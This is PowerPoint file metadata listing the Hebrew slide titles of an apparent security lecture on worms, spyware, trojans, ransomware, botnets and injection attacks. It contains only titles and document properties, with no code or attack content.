      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>תולעים  Wormsבאבטחת מידע</vt:lpstr>
      <vt:lpstr>תולעים  Worms</vt:lpstr>
      <vt:lpstr>כיצד תולעים מתפשטות</vt:lpstr>
      <vt:lpstr>סוגי תולעים</vt:lpstr>
      <vt:lpstr>כיצד לזהות תולעת</vt:lpstr>
      <vt:lpstr>התמודדות עם תולעים</vt:lpstr>
      <vt:lpstr>הגנה מפני תולעים</vt:lpstr>
      <vt:lpstr>פרקטיקות לכתיבת תולעת</vt:lpstr>
      <vt:lpstr>שלבים בסיסיים ביצירת תולעת</vt:lpstr>
      <vt:lpstr>המשך - שלבים בסיסיים ביצירת תולעת</vt:lpstr>
      <vt:lpstr>המשך - שלבים בסיסיים ביצירת תולעת</vt:lpstr>
      <vt:lpstr>המשך - שלבים בסיסיים ביצירת תולעת</vt:lpstr>
      <vt:lpstr>המשך - שלבים בסיסיים ביצירת תולעת</vt:lpstr>
      <vt:lpstr>המשך – שלבים בסיסיים ליצירת תולעת (הלכה למעשה)</vt:lpstr>
      <vt:lpstr>המשך – שלבים בסיסיים ליצירת תולעת (הלכה למעשה)</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>מה זה תוכנת ריגול?</vt:lpstr>
      <vt:lpstr>כיצד פועלות תוכנות ריגול</vt:lpstr>
      <vt:lpstr>סוגים של תוכנות ריגול</vt:lpstr>
      <vt:lpstr>כיצד תוכנות ריגול נבדלות מתוכנות זדוניות אחרות</vt:lpstr>
      <vt:lpstr>אמצעי הגנה מפני תוכנות ריגול</vt:lpstr>
      <vt:lpstr>חוקיות ורגולציה</vt:lpstr>
      <vt:lpstr>תסריטי התקפה</vt:lpstr>
      <vt:lpstr>ניסוי בתוכנת ריגול</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>הקדמה</vt:lpstr>
      <vt:lpstr>איך עובד סוס טרויאני?</vt:lpstr>
      <vt:lpstr>דוגמאות לסוסי טרויאני:</vt:lpstr>
      <vt:lpstr>מניעה והתמודדות עם סוס טרויאני:</vt:lpstr>
      <vt:lpstr>שאלות</vt:lpstr>
      <vt:lpstr>תשובות</vt:lpstr>
      <vt:lpstr>תשובות – המשך </vt:lpstr>
      <vt:lpstr>יצירת סוס טרויאני שמוחק קבצים</vt:lpstr>
      <vt:lpstr>יצירת סוס טרויאני שמוחק קבצים</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>מהי רוגלה Spyware ?</vt:lpstr>
      <vt:lpstr>סוגי רוגלות</vt:lpstr>
      <vt:lpstr>המשך – סוגי רוגלות</vt:lpstr>
      <vt:lpstr>איך רוגלות חודרות למחשב?</vt:lpstr>
      <vt:lpstr>סוגי רוגלות נוספים</vt:lpstr>
      <vt:lpstr>שיטות התפשטות נפוצות של רוגלות</vt:lpstr>
      <vt:lpstr>השפעות של רוגלות</vt:lpstr>
      <vt:lpstr>איך לזהות אם יש לך רוגלה?</vt:lpstr>
      <vt:lpstr>דוגמה מעשית: איך רוגלה עובדת?</vt:lpstr>
      <vt:lpstr>כיצד ניתן להתגונן מפני רוגלות?</vt:lpstr>
      <vt:lpstr>שאלות</vt:lpstr>
      <vt:lpstr>תשובות</vt:lpstr>
      <vt:lpstr>המשך - תשובות</vt:lpstr>
      <vt:lpstr>המשך - תשובות</vt:lpstr>
      <vt:lpstr>תירגול ביצירת רוגלה</vt:lpstr>
      <vt:lpstr>המשך - תירגול ביצירת רוגלה</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>מהי תוכנת כופר?</vt:lpstr>
      <vt:lpstr>איך תוכנת כופר פועלת?</vt:lpstr>
      <vt:lpstr>דוגמאות לתוכנות כופר מפורסמות:</vt:lpstr>
      <vt:lpstr>איך ניתן להגן מפני תוכנות כופר?</vt:lpstr>
      <vt:lpstr>סיפור מהעולם האמיתי:</vt:lpstr>
      <vt:lpstr>שאלות:</vt:lpstr>
      <vt:lpstr>תשובות:</vt:lpstr>
      <vt:lpstr>המשך - תשובות</vt:lpstr>
      <vt:lpstr>המשך - תשובות</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>מהי רשת בוטים?</vt:lpstr>
      <vt:lpstr>איך רשת בוטים נבנית?</vt:lpstr>
      <vt:lpstr>דוגמאות לפעולות של רשת בוטים</vt:lpstr>
      <vt:lpstr>המשך - דוגמאות לפעולות של רשת בוטים</vt:lpstr>
      <vt:lpstr>סוגי רשתות בוטים</vt:lpstr>
      <vt:lpstr>מחזור החיים של רשת בוטים</vt:lpstr>
      <vt:lpstr>המשך - מחזור החיים של רשת בוטים</vt:lpstr>
      <vt:lpstr>איך להגן מפני רשתות בוטים?</vt:lpstr>
      <vt:lpstr>דרכי הגנה מתקדמות</vt:lpstr>
      <vt:lpstr>שאלות:</vt:lpstr>
      <vt:lpstr>תשובות:</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>מה זה SQL Injection ?</vt:lpstr>
      <vt:lpstr>כיצד מתרחשת הזרקת SQL?</vt:lpstr>
      <vt:lpstr>סוגים של SQL Injection</vt:lpstr>
      <vt:lpstr>כיצד להגן מפני SQL Injection?</vt:lpstr>
      <vt:lpstr>דוגמה בסיסית להזרקת SQL</vt:lpstr>
      <vt:lpstr>המשך - דוגמה בסיסית להזרקת SQL</vt:lpstr>
      <vt:lpstr>דוגמה לשימוש בשאילתות פרמטריות ב-PHP</vt:lpstr>
      <vt:lpstr>המשך - דוגמה לשימוש בשאילתות פרמטריות ב-PHP</vt:lpstr>
      <vt:lpstr>Union-Based SQL Injection</vt:lpstr>
      <vt:lpstr>Boolean-Based Blind SQL Injection</vt:lpstr>
      <vt:lpstr>Time-Based Blind SQL Injection</vt:lpstr>
      <vt:lpstr>Extracting Data Using Error Messages</vt:lpstr>
      <vt:lpstr>Second-Order SQL Injection</vt:lpstr>
      <vt:lpstr>שאלות</vt:lpstr>
      <vt:lpstr>תשובות</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>מה זה Xpath Injection? </vt:lpstr>
      <vt:lpstr>מה זה Xpath?</vt:lpstr>
      <vt:lpstr>מבנה של XML</vt:lpstr>
      <vt:lpstr>כיצד Xpath פועלת?</vt:lpstr>
      <vt:lpstr>המשך - כיצד Xpath פועלת?</vt:lpstr>
      <vt:lpstr>הפונקציות והסימונים ב-Xpath</vt:lpstr>
      <vt:lpstr>איך עובד XPath Injection?</vt:lpstr>
      <vt:lpstr>המשך - איך עובד XPath Injection?</vt:lpstr>
      <vt:lpstr>איפה ניתן לבצע XPath Injection</vt:lpstr>
      <vt:lpstr>דוגמה להתקפה</vt:lpstr>
      <vt:lpstr>איך להגן על עצמך?</vt:lpstr>
      <vt:lpstr>שאלות:</vt:lpstr>
      <vt:lpstr>תשובות</vt:lpstr>
      <vt:lpstr>מצגת של PowerPoint‏</vt:lpstr>
      <vt:lpstr>מה זה XML Injection?</vt:lpstr>
      <vt:lpstr>מה זה XML?</vt:lpstr>
      <vt:lpstr>כיצד פועלת XML Injection?</vt:lpstr>
      <vt:lpstr>סוגי התקפות XML Injection</vt:lpstr>
      <vt:lpstr>דוגמה להזרקת XML</vt:lpstr>
      <vt:lpstr>שאלות</vt:lpstr>
      <vt:lpstr>תשובות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הרצאה 6</dc:title>
  <dc:creator>user</dc:creator>
  <cp:lastModifiedBy>Rivka Moradov</cp:lastModifiedBy>
  <cp:revision>68</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2024-08-14T09:23:43Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-09-11T19:55:31Z</dcterms:modified>
</cp:coreProperties>
</file>